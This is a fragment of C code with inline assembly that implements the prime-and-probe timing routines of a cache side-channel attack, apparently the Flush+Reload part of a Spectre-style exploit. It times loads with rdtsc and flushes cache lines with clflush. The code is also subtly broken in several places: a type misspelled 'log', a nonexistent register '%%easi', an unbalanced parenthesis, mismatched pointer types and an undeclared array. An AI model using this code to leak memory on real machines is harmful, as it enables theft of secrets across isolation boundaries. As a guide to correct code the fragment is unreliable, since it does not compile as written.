#define CACHE_MISS_THRESHOLD (60)
int prime() {
	int i, junk = 0;
	for (i = 0; i < 256; i++)
	junk += array2[i * 512];
	return junk;
}

unsigned long probe_one(char *adrs) {
	volatile unsigned log time;
	asm volatile ("mfence\t\n"
				"lfence\t\n"
				"rdtsc\t\n"
				"lfence\t\n"
				"movl %%eax, %%easi\t\n"
				"movl (%1), %%eax\t\n"
				"lfence\t\n"
				"rdtsc\t\n"
				"subl %%esi, %%eax\t\n"
				"clflush 0(%1)\t\n"
				: "=a"(time)
				: "c"(adrs)
				: "%esi", "%edx", "memory");
	return time;
}

void probe(int junk, int tries, char** array, uint64_t results[256]) {
	int i, mix_i;
	volatile uint8_t *addr;
	for(i=0; i<256; i++) {
		mix_i = ((i * 167) + 13) & 255);
		addr = array + (mix_i*512);
		results[mix_i] = probe_one(addr);
	}
}
	